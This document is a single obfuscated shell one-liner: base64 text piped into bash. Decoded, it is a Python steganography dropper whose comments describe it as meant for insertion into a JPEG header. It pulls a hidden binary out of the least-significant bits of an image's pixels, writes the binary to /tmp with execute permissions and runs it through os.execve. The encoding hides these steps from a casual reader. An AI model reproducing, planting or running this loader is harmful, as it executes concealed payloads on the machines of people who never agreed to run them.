echo "cHl0aG9uMwoKIyBUaGlzIGlzIGEgY29weSBvZiBzb21lIGZ1bmN0aW9ucyBmcm9tIHRoZSBmaWxlIHN0ZWdvLnB5IHRoZSByZWFzb24gZm9yIHRoaXMgZmlsZSBpcyB0byBjb250YWluIGp1c3QgdGhlIGVzc2VudGlhbCBwYXJ0cyBmb3IgCiMgdGhlIGV4dHJhY3Rpb24gb2YgYSBwYXlsb2FkIHVzaW5nIHN0ZWdhbm9ncmFwaHkgaW4gYSBzaW5nbGUgcmVkdWNlZCBmaWxlLCB0aGlzIGZpbGUgd2hhdCB3b3VsZCBiZSBpbnNlcnRlZCBpbnRvIHRoZSBqcGVnIGhlYWRlcgoKIyBUaGUgZmlsZSBwYXlsb2FkX2VuY29kZWQgY29udGFpbnMgdGhpcyBlbnRpcmUgcGF5bG9hZCBlbmRvZGVkIHVzaW5nIGJhc2U2NCB0b2dldGhlciB3aXRoIHRoZSBuZWNlc3NhcnkgbGludXggY29tbWFuZHMgdG8gZXhlY3V0ZSB0aGUgcGF5bG9hZAoKaW1wb3J0IG9zLCB0ZW1wZmlsZQpmcm9tIFBJTCBpbXBvcnQgSW1hZ2UKCmRlZiBvYnRhaW5fYml0cyh2YWx1ZSk6CiAgICAjIFJldHVybnMgYSBsaXN0IGNvbnRhaW5pbmcgdGhlIGJpbmFyeSByZXByZXNlbnRhdGlvbiBvZiBhIHZhbHVlCiAgICBiaXRzID0gW10KICAgIGZvciBpIGluIHJhbmdlKDcsIC0xLCAtMSk6CiAgICAgICAgYml0cy5hcHBlbmQoKHZhbHVlID4+IGkpICYgMSkKICAgIAogICAgcmV0dXJuIGJpdHMKCgpkZWYgb2J0YWluX2J5dGUoYml0cyk6CiAgICAjIEdpdmVuIGEgbGlzdCBvZiBiaXRzIGNhbGN1bGF0ZSB0aGUgZGVjaW1hbCB2YWx1ZSBvZiB0aGUgY29ycmVzcG9uZGluZyBieXRlCiAgICBpZiBsZW4oYml0cykgIT0gODoKICAgICAgICBwcmludCgiUHJvdmlkZWQgbGlzdCBpcyBub3QgYSBieXRlLCBsZW5ndGggIT0gOCIpCiAgICAgICAgcmV0dXJuCiAgICAKICAgIHZhbHVlID0gMAogICAgZm9yIGIgaW4gYml0czoKICAgICAgICB2YWx1ZSA9IDIqdmFsdWUgKyBiCiAgICAKICAgIHJldHVybiB2YWx1ZQoKCmRlZiBleHRyYWN0X2JpdHMoYnl0ZSwgaGlkZV9wYXR0ZXJuX2xpc3QpOgogICAgIyBFeHRyYWN0IHRoZSBiaXRzIGluZGljYXRlZCBpbiBoaWRlX3BhdHRlcm5fbGlzdAogICAgZXh0cmFjZWQgPSBbXQogICAgYml0c19mcm9tX2J5dGUgPSBvYnRhaW5fYml0cyhieXRlKQogICAgZm9yIGkgaW4gcmFuZ2UoOCk6CiAgICAgICAgaWYgaGlkZV9wYXR0ZXJuX2xpc3RbaV06ICMgSWYgaGlkZV9wYXR0ZXJfbGlzdFtpXSA9PSAxCiAgICAgICAgICAgIGV4dHJhY2VkLmFwcGVuZChiaXRzX2Zyb21fYnl0ZVtpXSkKICAgIAogICAgcmV0dXJuIGV4dHJhY2VkCgoKCmRlZiByZWNvdmVyX3NlY3JldChmaWxlLCBwYXlsb2FkX2xlbmd0aCwgaGlkZV9wYXR0ZXJuKToKCiAgICBpZiBoaWRlX3BhdHRlcm4gPT0gMHgwMDogIyBUaGUgcGF0dGVybiBjYW5ub3QgYmUgMHgwMCBiZWNhdXNlIG5vIGJpdHMgd291bGQgYmUgcmVwbGFjZWQKICAgICAgICBwcmludCgiRXJyb3IsIHRoZSBwcm92aWRlZCBwYXR0ZXJuIGRvZXMgbm90IGFsbG93IGhpZGluZyIpCiAgICAgICAgcmV0dXJuCiAgICAKICAgIGhpZGVfcGF0dGVybl9saXN0ID0gb2J0YWluX2JpdHMoaGlkZV9wYXR0ZXJuKSAjIFN0b3JlIHRoZSBoaWRlX3BhdHRlcm4gYmluYXJ5IHJlcHJlc2VudGF0aW9uIGluIGEgbGlzdAogICAgCiAgICB3aXRoIEltYWdlLm9wZW4oZmlsZSkgYXMgaW1nOiAKICAgICAgICBpbWcgPSBpbWcuY29udmVydCgiUkdCIikKICAgICAgICBpbWdfYnl0ZXMgPSBieXRlYXJyYXkoaW1nLnRvYnl0ZXMoKSkgIyBPYnRhaW4gYSBieXRlYXJyYXkgb2YgUkdCIHZhbHVlcwoKICAgIHJlY292ZXJlZF9wYXlsb2FkID0gW10KCiAgICByZWNvdmVyZWRfYnl0ZXMgPSAwCiAgICBiaXRzID0gW10KICAgIGN1cnJlbnRfYnl0ZSA9IDAKCiAgICB3aGlsZSByZWNvdmVyZWRfYnl0ZXMgPCBwYXlsb2FkX2xlbmd0aDoKICAgICAgICBiaXRzID0gYml0cyArIGV4dHJhY3RfYml0cyhpbWdfYnl0ZXNbY3VycmVudF9ieXRlXSwgaGlkZV9wYXR0ZXJuX2xpc3QpICMgQ29uY2F0IHRoZSBleHRyYWN0ZWQgYml0cyB0byBvdXIgY3VycmVudGx5IHJldHJpZXZlZCBsaXN0CiAgICAgICAgY3VycmVudF9ieXRlICs9IDEKCiAgICAgICAgaWYgbGVuKGJpdHMpID49IDg6ICMgV2hlbmV2ZXIgd2UgZXh0cmFjdCBhdCBsZWFzdCA4IGJpdHMsIHRha2UgdGhhdCBieXRlIGFuZCBzdG9yZSBpdCBpbiByZWNvdmVyZWRfcGF5bG9hZAogICAgICAgICAgICByZWNvdmVyZWRfcGF5bG9hZC5hcHBlbmQob2J0YWluX2J5dGUoYml0c1s6OF0pKQogICAgICAgICAgICBkZWwgYml0c1s6OF0KICAgICAgICAgICAgcmVjb3ZlcmVkX2J5dGVzICs9IDEKCiAgICAKICAgIHJldHVybiBieXRlcyhyZWNvdmVyZWRfcGF5bG9hZCkgIyBNb2RpZmllZCBmcm9tIHN0ZWdvLnB5IHRoZSBmaWxlIHdpbGwgYmUgd3JpdHRlbiBhbmQgbG9hZGVkIHVzaW5nIHRoZSBmdW5jdGlvbiBsb2FkX2FuZF9leGVjIChzZWUgbWVtX2xvYWRlci5weSkKCgpkZWYgbG9hZF9hbmRfZXhlYyhzcmNfYnl0ZXMpOgogICAgIyBUYWtlcyBhcyBhcmd1bWVudCBhIGJ5dGVhcnJheSBjb250YWluaW5nIGEgYmluYXJ5IGFuZCBleGVjdXRlcyBpdAogICAgZmQsIHBhdGggPSB0ZW1wZmlsZS5ta3N0ZW1wKHByZWZpeD0idG1wX2ZpbGVfIiwgZGlyPSIvdG1wIikgIyBDcmVhdGUgYSB0ZW1wX2ZpbGUgaW4gL3RtcCB0byBzdG9yZSB0aGUgYmluYXJ5CiAgICBvcy5mY2htb2QoZmQsIDBvNzAwKSAjIEFkZCBleGVjdXRpb24gcGVybWlzc2lvbnMKICAgIAogICAgdmlldyA9IG1lbW9yeXZpZXcoc3JjX2J5dGVzKSAjIFRoaXMgc2VjdGlvbiBjb3BpZXMgdGhlIGJ5dGVzIGZyb20gb3VyIGJ5dGVhcnJheSB0byB0aGUgbmV3bHkgY3JlYXRlZCBmaWxlIGluIC90bXAKICAgIHdoaWxlIHZpZXc6CiAgICAgICAgbiA9IG9zLndyaXRlKGZkLCB2aWV3KQogICAgICAgIHZpZXcgPSB2aWV3W246XQoKICAgIG9zLmNsb3NlKGZkKQoKICAgICMgRXhlY3V0ZSB0aGUgbG9hZGVkIGJpbmFyeQogICAgb3MuZXhlY3ZlKHBhdGgsIFsidG1wX2ZpbGUiXSwgb3MuZW52aXJvbikKCgojIEhlcmUgSSB3aWxsIGNhbGwgdGhlIGNvZGUgdGhhdCB1c2luZyB0aGUgZnVuY3Rpb25zIGFib3ZlIGV4dHJhY3RzIGFuZCBleGVjdXRlcyB0aGUgcGF5bG9hZC4KIyBJIHdpbGwgaGFyZGNvZGUgdGhlIGZpbGUgbmFtZXMgYW5kIHBheWxvYWQgc2l6ZXMgYW5kIG90aGVyIHZhcnMgdXNlZCBmb3IgdGhlIHNha2Ugb2Ygc2ltcGxpY2l0eToKCmxvYWRfYW5kX2V4ZWMocmVjb3Zlcl9zZWNyZXQoJ2hpZGRlbi5wbmcnLCAxNTg2MzIsIDB4MGYpKQo=" | base64 -d | bash